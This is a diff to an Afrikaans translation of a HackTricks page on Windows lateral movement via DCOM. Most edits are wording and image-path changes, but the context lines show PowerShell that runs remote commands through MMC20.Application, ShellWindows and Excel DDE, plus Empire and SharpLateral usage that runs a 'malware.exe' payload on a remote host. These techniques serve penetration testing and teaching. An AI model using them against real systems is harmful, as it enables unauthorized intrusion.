@@ -12,9 +12,9 @@
 
 </details>
 
-**Try Hard Security Group**
+**Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -29,9 +29,9 @@ Verspreide Komponentobjekmodel (DCOM) objekte bied 'n interessante vermoë vir n
 ```bash
 Get-CimInstance Win32_DCOMApplication
 ```
-Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak skryf van MMC snap-in operasies moontlik. Merkwaardig genoeg bevat hierdie objek 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) gevind word. Toets dit deur die volgende te hardloop:
+Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak skryf van MMC snap-in operasies moontlik. Merkwaardig genoeg bevat hierdie objek 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) gevind word. Toets dit deur:
 
-Hierdie kenmerk fasiliteer die uitvoer van bevele oor 'n netwerk deur 'n DCOM-toepassing. Om vanaf 'n afstand met DCOM as 'n admin te kan interageer, kan PowerShell as volg gebruik word:
+Hierdie kenmerk fasiliteer die uitvoering van bevele oor 'n netwerk deur 'n DCOM-toepassing. Om vanaf 'n afstand met DCOM te kan interageer as 'n admin, kan PowerShell as volg gebruik word:
 ```powershell
 [activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
 ```
@@ -62,7 +62,7 @@ Twee spesifieke voorwerpe, `ShellBrowserWindow` en `ShellWindows`, is uitgelig w
 ###  ShellWindows
 Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` voorwerpinstansiasie deur sy AppID te gebruik. Hierdie proses maak gebruik van OleView .NET om die CLSID vir `ShellWindows` te herwin. Eenmaal geïnstantieer, is interaksie moontlik deur die `WindowsShell.Item`-metode, wat tot metode-aanroeping soos `Document.Application.ShellExecute` lei.
 
-Voorbeeld PowerShell-opdragte is voorsien om die voorwerp te instansieer en opdragte op afstand uit te voer:
+Voorbeeld PowerShell-opdragte is voorsien om die voorwerp te instansieer en op afstand opdragte uit te voer:
 ```powershell
 $com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
 $obj = [System.Activator]::CreateInstance($com)
@@ -71,7 +71,7 @@ $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\sy
 ```
 ### Laterale Beweging met Excel DCOM-voorwerpe
 
-Laterale beweging kan bereik word deur DCOM Excel-voorwerpe te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM te lees op [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
+Laterale beweging kan bereik word deur DCOM Excel-voorwerpe te benut. Vir gedetailleerde inligting, is dit aan te beveel om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM te lees by [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).
 
 Die Empire-projek bied 'n PowerShell-skripsie wat die gebruik van Excel vir afgeleë kode-uitvoering (RCE) demonstreer deur DCOM-voorwerpe te manipuleer. Hieronder is uittreksels uit die skripsie beskikbaar op [Empire se GitHub-opberging](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
 ```powershell
@@ -98,9 +98,9 @@ $Obj.DDEInitiate("cmd", "/c $Command")
 ```
 ### Outomatiese Gereedskap vir Laterale Beweging
 
-Twee gereedskappe word uitgelig vir die outomatiseering van hierdie tegnieke:
+Twee gereedskappe word uitgelig vir die outomatiese uitvoering van hierdie tegnieke:
 
-- **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek voorsien word en wat die aanroeping van verskillende metodes vir die uitvoering van kode op afgeleë rekenaars vereenvoudig. Hierdie skrip is toeganklik by die Empire GitHub-opgaarplek.
+- **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek voorsien word en wat die aanroeping van verskillende metodes vir die uitvoering van kode op afgeleë masjiene vereenvoudig. Hierdie skrip is toeganklik by die Empire GitHub-opberging.
 
 - **SharpLateral**: 'n gereedskap wat ontwerp is vir die afgeleë uitvoering van kode, wat gebruik kan word met die bevel:
 ```bash
@@ -120,7 +120,7 @@ SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
 
 **Probeer Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -134,6 +134,6 @@ Ander maniere om HackTricks te ondersteun:
 * Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslaan.
+* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
 
 </details>
